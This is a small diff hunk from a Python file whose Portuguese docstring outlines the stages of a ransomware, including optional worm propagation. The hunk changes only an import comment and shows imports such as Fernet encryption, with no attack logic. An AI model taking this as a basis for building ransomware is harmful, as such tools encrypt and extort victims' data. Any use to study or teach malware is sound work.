@@ -7,7 +7,7 @@ Etapas de um ransoware:
 - Propagação (Worm) - Opcional;
 '''
 import base64
-import argparse # Adicionado para tratar argumentos
+import argparse 
 from pathlib import Path
 from cryptography.fernet import Fernet
 import os
